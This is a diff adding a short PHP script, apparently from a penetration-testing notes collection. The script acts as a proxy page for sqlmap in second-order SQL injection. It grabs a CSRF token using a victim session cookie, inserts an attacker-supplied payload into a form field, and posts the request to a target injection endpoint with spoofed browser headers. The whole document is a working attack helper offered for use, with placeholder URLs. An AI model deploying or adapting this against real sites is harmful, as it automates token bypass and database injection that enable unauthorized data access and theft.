@@ -1,0 +1,34 @@
+########2nd order page example
+#Idea here is you host the php page, then direct sqlmap to that page with the vulnerable inejction point being payload as an argument and cookie as your cookie for the request
+
+
+<?php
+//cookie vars 
+$cookievar = $_GET['cookie']; 
+$tokenURL = '//page for token//' . $cookievar; 
+$cookiecookie = ("displayoptions=1; _sid_=" . $cookievar); 
+//attack vars 
+$payload = $_GET['payload']; 
+$injectionURL = '//page for injection//'; 
+//grab the token 
+$grabresponse = file_get_contents($tokenURL); 
+preg_match_all('#s:32:"([^\s]+)"#', $grabresponse, $matches); 
+$string1 = "TOKEN = "; 
+print $string1; 
+//show we actually got the token
+$realtoken = implode (' ', $matches[1]); 
+echo $realtoken; 
+print "\r\n";
+//got token, moving on, notice inject point 
+$paramsPost = ('name=bob&surname=bob&email=bob %40bob.com&street_address=8850+Egestas+Ave&city=Berlin'.$payload.'&zip=29977647&password=&uID=500&token='. $realtoken); 
+$req = curl_init("//injection url//"); 
+curl_setopt($req, CURLOPT_RETURNTRANSFER, true); curl_setopt($req, CURLOPT_FOLLOWLOCATION, true); 
+curl_setopt($req, CURLOPT_POSTFIELDS, $paramsPost); 
+curl_setopt($req, CURLOPT_HTTPHEADER, array("Accept: application/json, text/javascript, */*; q=0.01","X-Requested-With: XMLHttpRequest","User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0","Referer: //whatever your initial grep was//","Connection: close","Accept-Language: en-US,en;q=0.5","Accept-Encoding: gzip, deflate","Content-Type: application/x-www-form-urlencoded; charset=UTF-8")); 
+curl_setopt($req, CURLOPT_COOKIE, $cookiecookie); 
+curl_setopt($req, CURLOPT_ENCODING, 'gzip'); 
+$result = curl_exec($req);
+echo "Status code: ".curl_getinfo($req, CURLINFO_HTTP_CODE)."\n"; 
+echo "Response body: ".$result."\n";
+curl_close($req);
+?>
